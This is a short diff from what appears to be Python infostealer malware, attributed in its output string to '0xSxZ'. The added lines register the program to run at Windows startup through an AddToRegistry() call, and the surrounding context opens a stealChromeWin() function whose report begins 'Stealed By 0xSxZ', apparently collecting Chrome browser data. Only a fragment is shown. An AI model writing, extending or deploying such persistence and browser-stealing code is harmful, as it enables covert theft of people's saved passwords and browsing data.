@@ -188,7 +188,8 @@ if yes == "yes":
 		else:
 			print("[.] Startup not available because os is Linux or mac.")
 
-
+	if(platform.system() == 'windows' or platform.system() == "Windows"):
+		AddToRegistry()
 	def stealChromeWin():
 		try:
 			res =  """Stealed By 0xSxZ ------------> \n\n"""
